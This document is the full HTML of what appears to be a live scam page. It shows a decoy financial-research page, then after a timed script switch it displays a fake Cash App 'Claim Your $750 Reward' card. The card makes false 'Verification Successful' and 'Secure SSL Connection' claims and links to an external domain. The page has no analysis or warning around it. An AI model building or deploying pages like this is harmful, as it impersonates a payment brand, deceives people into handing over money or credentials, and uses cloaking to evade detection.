<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Global Financial Literacy - Research Node 2026</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* تهيئة الشاشة لتكون كاملة بنسبة 100% */
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden; /* يمنع السكرول غير الضروري */
        }

        #safe-site { 
            display: block; 
            height: 100%;
            padding: 20px; 
            font-family: serif; 
            background: white; 
        }
        
        #money-site { 
            display: none; 
            height: 100%; /* ملء الطول بالكامل */
            width: 100%;
            background-color: #f5f5f7;
        }
        
        .pulsate { 
            animation: pulse-green 2s infinite; 
        }

        @keyframes pulse-green {
            0% { box-shadow: 0 0 0 0 rgba(0, 208, 132, 0.7); }
            70% { box-shadow: 0 0 0 20px rgba(0, 208, 132, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 208, 132, 0); }
        }

        /* جعل البطاقة تأخذ مساحة أكبر على الموبايل */
        .mobile-container {
            width: 100%;
            max-width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
    </style>
</head>
<body class="antialiased">

    <div id="safe-site" class="overflow-y-auto text-left">
        <h1 class="text-2xl font-bold mb-4">Financial Ecosystem Analysis</h1>
        <p>Analyzing digital peer-to-peer transaction velocity in North American markets...</p>
        <img src="https://images.unsplash.com/photo-1551288049-bbda38a5f452?auto=format&fit=crop&w=800&q=80" class="w-full rounded-xl my-4">
    </div>

    <div id="money-site">
        <div class="mobile-container">
            <div class="bg-white w-full max-w-[400px] rounded-[3rem] p-10 shadow-2xl border border-gray-50 text-center">
                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c5/Square_Cash_app_logo.svg" class="w-24 h-24 mx-auto mb-8">
                
                <h1 class="text-3xl font-black mb-4 text-gray-900 tracking-tight">Claim Your $750 Reward</h1>
                <p class="text-gray-500 mb-10 text-lg font-medium">Status: <span class="text-green-500">Ready</span><br>Verification Successful.</p>
                
                <a href="https://feraveromonster.ink/sl/31roj" 
                   class="pulsate w-full py-6 bg-[#00d084] text-white rounded-2xl font-black text-xl block shadow-xl uppercase tracking-widest active:scale-95 transition-transform">
                    Claim Reward Now
                </a>

                <div class="mt-10 flex justify-center items-center gap-2 text-sm text-gray-400 font-bold uppercase tracking-tighter">
                    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
                    Secure SSL Connection
                </div>
            </div>
        </div>
    </div>

    <script>
        // التبديل الذكي
        setTimeout(function() {
            document.getElementById('safe-site').style.display = 'none';
            document.getElementById('money-site').style.display = 'block';
            
            // تغيير لون شريط الحالة في بعض المتصفحات
            document.title = "Payment Pending - $750";
            document.body.style.backgroundColor = "#f5f5f7";
        }, 2200);
    </script>

</body>
</html>
